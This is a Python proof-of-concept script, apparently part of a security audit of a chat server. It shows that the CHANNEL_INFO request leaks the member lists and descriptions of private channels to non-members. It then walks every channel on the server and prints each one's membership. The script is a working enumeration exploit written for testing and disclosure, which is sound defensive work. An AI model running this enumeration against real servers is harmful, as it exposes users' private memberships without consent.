"""
PoC: CHANNEL_INFO exposes member lists and descriptions to non-members.

Any authenticated user can enumerate every channel's membership without
joining the channel. The server does not check membership before responding
to CHANNEL_INFO (request_type 6).

Run with: uv run python vulnerabilities/pocs/poc_channel_info_disclosure.py
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

import random
import time
from vulnerabilities.lib.probe import make_handle, connect_cleartext, send_recv

def main():
    # --- Setup ---
    # User A: creates a private channel they own
    sock_a, session_a, username_a = connect_cleartext()
    channel = f"private-{random.randint(10000, 99999)}"
    send_recv(sock_a, {
        'request_type': 4, 'session': session_a,
        'request_handle': make_handle(),
        'channel': channel, 'description': 'confidential members only'
    })
    print(f"[A] Created private channel: {channel}")
    print(f"[A] Username: {username_a}")
    time.sleep(0.3)

    # User B: never joins the channel
    sock_b, session_b, username_b = connect_cleartext()
    print(f"[B] Username: {username_b} (never joined {channel})")

    # --- Exploit ---
    # B calls CHANNEL_INFO on A's private channel
    r = send_recv(sock_b, {
        'request_type': 6, 'session': session_b,
        'request_handle': make_handle(),
        'channel': channel
    })

    print(f"\n[B] CHANNEL_INFO result on channel user B never joined:")
    print(f"    response_type : {r.get(b'response_type')}")
    print(f"    channel       : {r.get(b'channel')}")
    print(f"    description   : {r.get(b'description')}")
    print(f"    members       : {r.get(b'members')}")

    members = r.get(b'members', [])
    desc    = r.get(b'description', b'')
    if members or desc:
        print(f"\n[!] VULNERABLE: non-member received full channel info")
        print(f"    Members exposed: {[m.decode() for m in members]}")
        print(f"    Description:     {desc.decode()}")
    else:
        print(f"\n[OK] Not vulnerable — non-member did not receive channel data")

    # --- Full enumeration demo ---
    print(f"\n[B] Enumerating ALL channel memberships across the server:")
    cl = send_recv(sock_b, {
        'request_type': 5, 'session': session_b,
        'request_handle': make_handle(), 'offset': 0
    })
    channels = cl.get(b'channels', []) if cl else []
    for ch in channels:
        info = send_recv(sock_b, {
            'request_type': 6, 'session': session_b,
            'request_handle': make_handle(), 'channel': ch.decode()
        })
        members = info.get(b'members', []) if info else []
        print(f"    {ch.decode()}: {[m.decode() for m in members]}")
        time.sleep(0.1)

    # Cleanup
    send_recv(sock_a, {
        'request_type': 8, 'session': session_a,
        'request_handle': make_handle(), 'channel': channel
    })
    sock_a.close()
    sock_b.close()

if __name__ == '__main__':
    main()
